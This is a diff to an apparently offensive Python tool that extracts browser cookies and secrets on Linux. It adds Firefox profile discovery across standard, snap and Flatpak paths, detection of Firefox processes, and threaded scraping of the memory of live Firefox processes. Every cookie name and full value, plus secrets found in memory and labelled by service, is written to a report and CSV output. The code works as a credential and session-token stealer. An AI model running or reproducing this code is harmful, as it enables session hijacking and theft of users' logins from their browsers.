@@ -596,9 +596,22 @@ def extract_cookies(profile_path: str, key: bytes) -> list[dict]:
 
 
 # ── Firefox cookie extraction ──────────────────────────────────────────────────
+def _firefox_profiles_dir() -> str | None:
+    """Return the Firefox profiles directory, checking standard and snap locations."""
+    candidates = [
+        os.path.join(HOME, ".mozilla", "firefox"),
+        os.path.join(HOME, "snap", "firefox", "common", ".mozilla", "firefox"),
+        os.path.join(HOME, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox"),  # Flatpak
+    ]
+    for path in candidates:
+        if os.path.isdir(path):
+            return path
+    return None
+
+
 def extract_firefox_cookies_linux() -> list[dict]:
-    profiles_dir = os.path.join(HOME, ".mozilla", "firefox")
-    if not os.path.isdir(profiles_dir):
+    profiles_dir = _firefox_profiles_dir()
+    if not profiles_dir:
         return []
     results = []
     for profile_name in os.listdir(profiles_dir):
@@ -1591,10 +1604,12 @@ def main():
         if exists:
             lines.append(f"    path: {bpath}")
 
-    ff_dir = os.path.join(HOME, ".mozilla", "firefox")
-    ff_exists = os.path.isdir(ff_dir)
-    lines.append(f"  {'Firefox':<20} {'INSTALLED' if ff_exists else 'not found'}")
-    if ff_exists:
+    ff_dir = _firefox_profiles_dir()
+    ff_running = is_process_running("firefox")
+    ff_pids = find_pids("firefox")
+    ff_status = ("INSTALLED" if ff_dir else "not found") + ("  RUNNING (PIDs: " + ",".join(map(str, ff_pids)) + ")" if ff_running else "")
+    lines.append(f"  {'Firefox':<20} {ff_status}")
+    if ff_dir:
         lines.append(f"    path: {ff_dir}")
 
     targets = BROWSERS
@@ -1627,22 +1642,67 @@ def main():
 
     # Firefox
     lines.append("\n" + "=" * 70)
-    lines.append("  BROWSER: Firefox")
+    ff_running = is_process_running("firefox")
+    lines.append(f"  BROWSER: Firefox  [{'RUNNING' if ff_running else 'closed'}]")
     lines.append("=" * 70)
-    try:
-        ff_cookies = extract_firefox_cookies_linux()
-        if ff_cookies:
-            lines.append(f"[+] {len(ff_cookies)} Firefox cookie(s) across all profiles\n")
-            for ck in ff_cookies:
-                lines.append(f"  Profile:  {ck.get('profile', '?')}")
-                lines.append(f"  Host:     {ck['host']}")
-                lines.append(f"  Name:     {ck['name']}")
-                lines.append(f"  Value:    {ck['value']}")
-                lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck.get('samesite', '?')}\n")
+
+    if do_disk:
+        lines.append("\n  -- [DISK] Cookies --")
+        try:
+            ff_cookies = extract_firefox_cookies_linux()
+            if ff_cookies:
+                lines.append(f"[+] {len(ff_cookies)} Firefox cookie(s) across all profiles\n")
+                for ck in ff_cookies:
+                    lines.append(f"  Profile:  {ck.get('profile', '?')}")
+                    lines.append(f"  Host:     {ck['host']}")
+                    lines.append(f"  Name:     {ck['name']}")
+                    lines.append(f"  Value:    {ck['value']}")
+                    lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck.get('samesite', '?')}\n")
+                    all_csv_rows.append({
+                        "browser": "Firefox", "profile": ck.get("profile", "?"),
+                        "label": "Cookie", "service": ck["host"],
+                        "value": f"{ck['name']}={ck['value']}", "address": ck["host"],
+                    })
+            else:
+                lines.append("  [--] Firefox not installed or no cookies found")
+        except Exception as e:
+            lines.append(f"  [-] Firefox error: {e}")
+
+    lines.append("\n  -- [MEMORY] Live Scrape --")
+    if not do_memory:
+        lines.append("  [--] Skipped (--disk-only)")
+    elif not ff_running:
+        lines.append("  [--] Firefox not running")
+    else:
+        ff_pids = list(set(find_pids("firefox")))
+        ff_hits: list[dict] = []
+        ff_errors: list[str] = []
+        with ThreadPoolExecutor(max_workers=min(len(ff_pids), 8)) as pool:
+            futures = {pool.submit(scrape_pid, pid, args.max_hits): pid for pid in ff_pids}
+            for future in as_completed(futures):
+                pid = futures[future]
+                try:
+                    ff_hits.extend(future.result())
+                except PermissionError as e:
+                    ff_errors.append(f"PID {pid}: {e}")
+                except Exception as e:
+                    ff_errors.append(f"PID {pid}: {e}")
+        for e in ff_errors:
+            lines.append(f"  [-] {e}")
+        unique_ff = deduplicate(ff_hits)
+        if not unique_ff:
+            lines.append("  [-] No hits found")
         else:
-            lines.append("  [--] Firefox not installed or no cookies found")
-    except Exception as e:
-        lines.append(f"  [-] Firefox error: {e}")
+            lines.append(f"[+] {len(unique_ff)} unique hit(s)  (across {len(ff_pids)} PID(s))\n")
+            for h in unique_ff:
+                h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
+                val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
+                lines.append(f"  {h['label'][:22]:<22}  {h['_svc'][:28]:<28}  {val}")
+                all_csv_rows.append({
+                    "browser": "Firefox", "profile": "(memory)",
+                    "label": h["label"], "service": h["_svc"],
+                    "value": h["value"], "address": h.get("address", ""),
+                })
 
     report = "\n".join(lines)
 
